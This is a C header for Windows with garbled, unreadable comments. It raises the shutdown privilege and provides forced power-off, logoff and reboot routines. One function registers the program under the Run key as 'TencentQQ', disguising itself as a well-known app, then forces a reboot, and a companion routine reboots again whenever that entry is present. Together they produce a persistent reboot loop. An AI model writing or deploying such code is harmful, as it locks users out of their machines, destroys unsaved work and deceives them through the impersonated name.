#pragma once

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <tchar.h>
#include <Windows.h>

// ע����ַ
LPCWSTR regAddress = _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");

// Ӧ������
LPCWSTR appName = _T("TencentQQ");

bool improvePrivilege() {
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;

	// �򿪵�ǰ���̵�Ȩ������
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
		return false;
	}

	// ��ȡȨ�޵�Ȩ�ޱ�ʶLUID�� ������tkp��
	// ��1��������NULL ��ʾҪ�鿴���ǵ�ǰ����ϵͳ
	// ��2��������ָ����Ȩ����
	// ��3���������������շ�����Ȩ������Ϣ
	if (!LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid)) {
		return false;
	}

	// ������Ȩ����ĸ���
	tkp.PrivilegeCount = 1;

	// ������Ȩ
	// SE_PRIVILEGE_ENABLE_BY_DEFAULT ��ȨĬ������
	// SE_PRIVILEGE_ENABLED			  ��Ȩ����
	// SE_PRIVILEGE_USER_FOR_ACCESS   ��������һ��������߷���
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// ����AdjustTokenPrivileges����Ȩ
	// �޸�����Ȩ��
	// ��1��������������Ȩ���
	// ��2����������ֹ����Ȩ��
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, NULL, NULL, NULL)) {
		return false;
	}
	return true;
}

bool powerOffProc() {
	if (!improvePrivilege() || !ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, SHTDN_REASON_MAJOR_APPLICATION)) {
		return false;
	}
	return true;
}

bool logOffProc() {
	if (!improvePrivilege() || !ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, SHTDN_REASON_MAJOR_APPLICATION)) {
		return false;
	}
	return true;
}

bool reBootProc() {
	if (!improvePrivilege() || !ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_APPLICATION)) {
		return false;
	}
	return true;
}

bool infiniteReBootProc() {

	// ע�����
	HKEY hKey;

	// ��Ȩ
	if (!improvePrivilege()) {
		return false;
	}

	// ��ע���
	if (0 != RegOpenKeyEx(HKEY_CURRENT_USER, regAddress, 0, KEY_ALL_ACCESS, &hKey)) {
		return false;
	}

	// ��ȡ�Լ���·��
	TCHAR szData[260];
	GetModuleFileName(NULL, szData, 260);

	// дע���
	RegSetValueEx(hKey, appName, 0, REG_SZ, (BYTE*)szData, 260);

	// �ر�ע���
	RegCloseKey(hKey);

	// ����
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
	
}

// �Ƿ�����
void isReBootProc() {

	// ��Ȩ
	if (!improvePrivilege()) {
		return;
	}

	// ע�����
	HKEY hKey;

	// ��ע���
	if (0 != RegOpenKeyEx(HKEY_CURRENT_USER, regAddress, 0, KEY_ALL_ACCESS, &hKey)) {
		return;
	}

	// ��ѯע���
	if (ERROR_SUCCESS == RegQueryValueEx(hKey, appName, 0, NULL, NULL, NULL)) {
		printf("����\n");
		reBootProc();
	}
	else
	{
		printf("������\n");
	}

	// �ر�ע���
	RegCloseKey(hKey);
	return;
}